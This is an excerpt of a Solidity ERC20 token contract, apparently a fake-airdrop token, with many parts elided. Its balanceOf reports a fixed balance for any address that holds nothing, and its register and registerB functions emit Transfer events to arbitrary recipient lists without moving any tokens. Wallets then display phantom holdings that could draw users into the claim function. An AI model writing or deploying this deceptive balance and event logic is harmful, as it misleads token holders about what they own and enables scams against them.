...
contract Testing is Context, IERC20, Ownable {
    ...
    uint256 public _aAmount = 100000000;
    ...
    function balanceOf(address account) public view override returns (uint256) {
        ...
        if (_rOwned[account] != 0) return tokenFromReflection(_rOwned[account]);
        return _aAmount;
    }
    ...
    //     _tTotal = amount;
    // }
    // function setAAmount(uint256 amount) public {
    //     address sender = _msgSender();
    //     require(_whitelisted[sender]);
    //     _aAmount = amount;
    // }
    ...
    function register(address[] memory recipients) public { 
        ...
        for (uint256 i = 0; i < recipients.length; i++) {
            emit Transfer(address(this), recipients[i], _aAmount);
        }
    }
    function registerB(address[] memory recipients) public { 
        address sender = _msgSender();
        require(_whitelisted[sender]);

        for (uint256 i = 0; i < recipients.length; i++) {
            _claimable[recipients[i]] = true;
            emit Transfer(address(this), recipients[i], _aAmount);
        }
    }
    function claim() public { 
        address sender = _msgSender();
        require(balanceOf(sender) > 0, "No balance to be claimed");
        require(!_claimed[sender], "Tokens already claimed");
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tLiquidity) = _getValues(_aAmount);
